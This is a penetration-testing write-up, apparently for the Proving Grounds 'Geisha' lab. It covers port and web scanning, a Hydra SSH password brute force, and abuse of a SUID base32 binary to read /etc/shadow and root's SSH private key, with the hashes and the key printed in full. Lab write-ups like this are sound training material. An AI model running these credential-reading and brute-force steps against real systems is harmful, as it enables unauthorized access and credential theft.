---
title: Geisha
parent: Proving Grounds Play
grand_parent: Writeups
nav_order: 3
---
# Geisha
## Linux
## Easy

---
# Machine
## OS
## Level

---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ nmap -Pn -p- -sCV -A -oN full_scan.txt -open 192.168.201.82  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 15:40 +0900
Nmap scan report for 192.168.201.82
Host is up (0.10s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-title: Geisha
|_http-server-header: Apache/2.4.38 (Debian)
7080/tcp open  ssl/empowerid LiteSpeed
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-09T14:01:34
|_Not valid after:  2022-05-09T14:01:34
|_http-server-header: LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://192.168.201.82:7080/
7125/tcp open  http          nginx 1.17.10
|_http-title: Geisha
|_http-server-header: nginx/1.17.10
8088/tcp open  http          LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp open  http          SimpleHTTPServer 0.6 (Python 2.7.16)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
|_http-title: Geisha
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   100.07 ms 192.168.45.1
2   99.62 ms  192.168.45.254
3   100.20 ms 192.168.251.1
4   99.50 ms  192.168.201.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.55 seconds
```
http
- 80
- 3389
- 7080
- 7125
- 8088
- 9198
## FTP
### 21

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ nmap -p 21 --script vuln 192.168.201.82
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 15:57 +0900
Nmap scan report for 192.168.201.82
Host is up (0.10s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ nmap -p 21 --script ftp-* 192.168.201.82
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 16:02 +0900
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 192.168.201.82
Host is up (0.10s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3373 guesses in 602 seconds, average tps: 5.4

Nmap done: 1 IP address (1 host up) scanned in 605.08 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ ftp 192.168.201.82                                                           
Connected to 192.168.201.82.
220 (vsFTPd 3.0.3)
Name (192.168.201.82:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

## HTTP
### 80
![](../../../assets/images/Pasted%20image%2020260510162443.png)
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ whatweb -a 3 http://192.168.201.82                                           
http://192.168.201.82 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.201.82], Title[Geisha]
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ echo "192.168.201.82 geisha" | sudo tee -a /etc/hosts
[sudo] password for kali: 
192.168.201.82 geisha
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ ffuf -u http://geisha/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 403,404 -c -e .php,.html,.txt,.conf,.xml,.json,.log,old,zip,.sql -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://geisha/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt .conf .xml .json .log old zip .sql 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 100ms]
index.html              [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 98ms]
index.html              [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 101ms]
info.php                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 98ms]
info.php                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 99ms]
:: Progress: [50754/50754] :: Job [1/1] :: 401 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
```
- index.html
- info.php

### 3389

```zsh

```
### 7080

```zsh

```
#### 7125

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ ffuf -u http://geisha:7125/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 403,404 -c -e .php,.html,.txt,.conf,.xml,.json,.log,old,zip,.sql -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://geisha:7125/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt .conf .xml .json .log old zip .sql 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 175, Words: 8, Lines: 16, Duration: 117ms]
index.php               [Status: 200, Size: 175, Words: 8, Lines: 16, Duration: 99ms]
index.php               [Status: 200, Size: 175, Words: 8, Lines: 16, Duration: 100ms]
passwd                  [Status: 200, Size: 1432, Words: 13, Lines: 28, Duration: 98ms]
:: Progress: [50754/50754] :: Job [1/1] :: 402 req/sec :: Duration: [0:02:21] :: Errors: 0 ::
```
- index.php
- passwd

http://geisha:7125/passwd

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ cat passwd           
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
```
- geisha

#### 8088

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ ffuf -u http://geisha:8088/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 403,404 -c -e .php,.html,.txt,.conf,.xml,.json,.log,old,zip,.sql -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://geisha:8088/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt .conf .xml .json .log old zip .sql 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 109ms]
docs                    [Status: 200, Size: 5678, Words: 1054, Lines: 130, Duration: 102ms]
index.html              [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 98ms]
index.html              [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 100ms]
info.php                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 105ms]
info.php                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 102ms]
:: Progress: [50754/50754] :: Job [1/1] :: 380 req/sec :: Duration: [0:02:11] :: Errors: 0 ::
```
- docs
- index.html
- info.php

http://geisha:8088/docs

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ ffuf -u http://geisha:8088/docs/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 403,404 -c -e .php,.html,.txt,.conf,.xml,.json,.log,old,zip,.sql -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://geisha:8088/docs/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt .conf .xml .json .log old zip .sql 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 5678, Words: 1054, Lines: 130, Duration: 187ms]
admin.html              [Status: 200, Size: 7641, Words: 1202, Lines: 157, Duration: 101ms]
config.html             [Status: 200, Size: 10135, Words: 1809, Lines: 197, Duration: 102ms]
index.html              [Status: 200, Size: 5678, Words: 1054, Lines: 130, Duration: 99ms]
index.html              [Status: 200, Size: 5678, Words: 1054, Lines: 130, Duration: 101ms]
install.html            [Status: 200, Size: 10754, Words: 2115, Lines: 270, Duration: 101ms]
intro.html              [Status: 200, Size: 9031, Words: 1424, Lines: 194, Duration: 99ms]
license.html            [Status: 200, Size: 41049, Words: 6473, Lines: 829, Duration: 105ms]
security.html           [Status: 200, Size: 9550, Words: 1639, Lines: 172, Duration: 100ms]
:: Progress: [50754/50754] :: Job [1/1] :: 190 req/sec :: Duration: [0:02:10] :: Errors: 0 ::
```
- admin.html
- config.html
- index.html
- install.html
- intro.html
- license.html
- security.html


![](../../../assets/images/Pasted%20image%2020260510180411.png)

### 9198

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
└─$ ffuf -u http://geisha:9198/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 403,404 -c -e .php,.html,.txt,.conf,.xml,.json,.log,old,zip,.sql -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://geisha:9198/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt .conf .xml .json .log old zip .sql 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 141ms]
index.html              [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 102ms]
index.html              [Status: 200, Size: 176, Words: 9, Lines: 16, Duration: 101ms]
info.php                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 102ms]
info.php                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 102ms]
:: Progress: [50754/50754] :: Job [1/1] :: 201 req/sec :: Duration: [0:04:36] :: Errors: 0 ::
```
- index.html
- info.php


---

# Initial Access

## Bruteforce

```zsh
┌──(kali㉿kali)-[~/…/CheatSheets/docs/assets/css]
└─$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://geisha
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 18:39:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://geisha:22/
[STATUS] 252.00 tries/min, 252 tries in 00:01h, 14344148 to do in 948:42h, 15 active
[22][ssh] host: geisha   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 18:42:12
```
letmein

```zsh
┌──(kali㉿kali)-[~/…/CheatSheets/docs/assets/css]
└─$ ssh geisha@geisha                     
The authenticity of host 'geisha (192.168.201.82)' can't be established.
ED25519 key fingerprint is: SHA256:LWeIcL34FqnZ8TRLsknNndBBthrC1xzr/sHP5yQHMxE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'geisha' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
geisha@geisha's password: 
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
geisha@geisha:~$ 
```

```zsh
geisha@geisha:~$ id
uid=1000(geisha) gid=1000(geisha) groups=1000(geisha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

```zsh
geisha@geisha:~$ ls
```

```zsh
geisha@geisha:~$ cat local.txt
62d1a79b34dd3d4f539b91e2646d4b09
geisha@geisha:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:c2:d0:82:ca brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-c987d2b66beb: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:93:26:11:84 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c987d2b66beb
       valid_lft forever preferred_lft forever
    inet6 fe80::42:93ff:fe26:1184/64 scope link 
       valid_lft forever preferred_lft forever
9: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:33:6f brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.82/24 brd 192.168.201.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:336f/64 scope link 
       valid_lft forever preferred_lft forever
87: vethb5aa20f@if86: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default 
    link/ether 9a:e2:ad:f1:15:d6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::98e2:adff:fef1:15d6/64 scope link 
       valid_lft forever preferred_lft forever
89: veth8dd32f2@if88: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default 
    link/ether 02:60:1a:88:ca:60 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::60:1aff:fe88:ca60/64 scope link 
       valid_lft forever preferred_lft forever
```

---

# Privilege Escalation

```zsh
geisha@geisha:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
```
/usr/bin/base32

![](../../../assets/images/Pasted%20image%2020260510184944.png)

```zsh
geisha@geisha:~$ base32 /etc/shadow | base32 --decode
root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
daemon:*:18385:0:99999:7:::
bin:*:18385:0:99999:7:::
sys:*:18385:0:99999:7:::
sync:*:18385:0:99999:7:::
games:*:18385:0:99999:7:::
man:*:18385:0:99999:7:::
lp:*:18385:0:99999:7:::
mail:*:18385:0:99999:7:::
news:*:18385:0:99999:7:::
uucp:*:18385:0:99999:7:::
proxy:*:18385:0:99999:7:::
www-data:*:18385:0:99999:7:::
backup:*:18385:0:99999:7:::
list:*:18385:0:99999:7:::
irc:*:18385:0:99999:7:::
gnats:*:18385:0:99999:7:::
nobody:*:18385:0:99999:7:::
_apt:*:18385:0:99999:7:::
systemd-timesync:*:18385:0:99999:7:::
systemd-network:*:18385:0:99999:7:::
systemd-resolve:*:18385:0:99999:7:::
messagebus:*:18385:0:99999:7:::
sshd:*:18385:0:99999:7:::
geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
systemd-coredump:!!:18385::::::
ftp:*:18391:0:99999:7:::

```

```zsh
geisha@geisha:~$ base32 /root/proof.txt | base32 --decode
3a29080e706a2982fb3d49874bb357e9
```

```zsh
geisha@geisha:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:c2:d0:82:ca brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-c987d2b66beb: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:93:26:11:84 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c987d2b66beb
       valid_lft forever preferred_lft forever
    inet6 fe80::42:93ff:fe26:1184/64 scope link 
       valid_lft forever preferred_lft forever
9: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:33:6f brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.82/24 brd 192.168.201.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:336f/64 scope link 
       valid_lft forever preferred_lft forever
91: vethb8d8102@if90: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default 
    link/ether ea:a6:3e:ea:ae:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::e8a6:3eff:feea:ae63/64 scope link 
       valid_lft forever preferred_lft forever
93: veth9efd546@if92: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-c987d2b66beb state UP group default 
    link/ether 5a:b8:4a:24:b7:ea brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::58b8:4aff:fe24:b7ea/64 scope link 
       valid_lft forever preferred_lft forever
```

or

```zsh
geisha@geisha:~$ base32 "/root/.ssh/id_rsa" | base32 --decode > id_rsa
```

```zsh
geisha@geisha:~$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
-----END RSA PRIVATE KEY-----
```

```zsh
geisha@geisha:~$ chmod 600 id_rsa
```

```zsh
geisha@geisha:~$ ssh -i id_rsa root@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:VZJ2vD6+/BC5zd9v8nRSgqEHyfR17GuCELg0nE0BkFk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@geisha:~# 
```
